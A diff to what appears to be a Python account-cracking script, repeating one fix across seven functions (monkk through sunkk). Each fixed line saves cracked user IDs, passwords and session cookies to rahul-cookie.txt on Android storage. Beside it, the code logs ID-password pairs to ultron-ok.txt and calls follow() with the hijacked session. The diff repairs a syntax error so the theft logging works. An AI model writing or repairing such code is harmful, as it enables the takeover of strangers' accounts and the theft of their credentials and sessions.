@@ -424,7 +424,7 @@ def monkk(idf,pwv):
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
 				open('/storage/emulated/0/ultron-ok.txt', 'a').write(idf+' | '+pw+'\n')
-				open('/storage/emulated/0/rahul-cookie.txt', 'a').write(idf+' | '+pw+ ' | ' coki+'\n')
+				open('/storage/emulated/0/rahul-cookie.txt', 'a').write(idf+' | '+pw+ ' | '+coki+'\n')
 				follow(ses,coki)
 				break
 
@@ -466,7 +466,7 @@ def tuekk(idf,pwv):
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
 				open('/storage/emulated/0/ultron-ok.txt', 'a').write(idf+' | '+pw+'\n')
-				open('/storage/emulated/0/rahul-cookie.txt', 'a').write(idf+' | '+pw+ ' | ' coki+'\n')
+				open('/storage/emulated/0/rahul-cookie.txt', 'a').write(idf+' | '+pw+ ' | '+coki+'\n')
 				follow(ses,coki)
 				break
 
@@ -508,7 +508,7 @@ def wedkk(idf,pwv):
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
 				open('/storage/emulated/0/ultron-ok.txt', 'a').write(idf+' | '+pw+'\n')
-				open('/storage/emulated/0/rahul-cookie.txt', 'a').write(idf+' | '+pw+ ' | ' coki+'\n')
+				open('/storage/emulated/0/rahul-cookie.txt', 'a').write(idf+' | '+pw+ ' | '+coki+'\n')
 				follow(ses,coki)
 				break
 
@@ -550,7 +550,7 @@ def thurskk(idf,pwv):
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
 				open('/storage/emulated/0/ultron-ok.txt', 'a').write(idf+' | '+pw+'\n')
-				open('/storage/emulated/0/rahul-cookie.txt', 'a').write(idf+' | '+pw+ ' | ' coki+'\n')
+				open('/storage/emulated/0/rahul-cookie.txt', 'a').write(idf+' | '+pw+ ' | '+coki+'\n')
 				follow(ses,coki)
 				break
 
@@ -592,7 +592,7 @@ def frikk(idf,pwv):
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
 				open('/storage/emulated/0/ultron-ok.txt', 'a').write(idf+' | '+pw+'\n')
-				open('/storage/emulated/0/rahul-cookie.txt', 'a').write(idf+' | '+pw+ ' | ' coki+'\n')
+				open('/storage/emulated/0/rahul-cookie.txt', 'a').write(idf+' | '+pw+ ' | '+coki+'\n')
 				follow(ses,coki)
 				break
 
@@ -634,7 +634,7 @@ def satkk(idf,pwv):
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
 				open('/storage/emulated/0/ultron-ok.txt', 'a').write(idf+' | '+pw+'\n')
-				open('/storage/emulated/0/rahul-cookie.txt', 'a').write(idf+' | '+pw+ ' | ' coki+'\n')
+				open('/storage/emulated/0/rahul-cookie.txt', 'a').write(idf+' | '+pw+ ' | '+coki+'\n')
 				follow(ses,coki)
 				break
 
@@ -676,7 +676,7 @@ def sunkk(idf,pwv):
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
 				open('/storage/emulated/0/ultron-ok.txt', 'a').write(idf+' | '+pw+'\n')
-				open('/storage/emulated/0/rahul-cookie.txt', 'a').write(idf+' | '+pw+ ' | ' coki+'\n')
+				open('/storage/emulated/0/rahul-cookie.txt', 'a').write(idf+' | '+pw+ ' | '+coki+'\n')
 				follow(ses,coki)
 				break
 
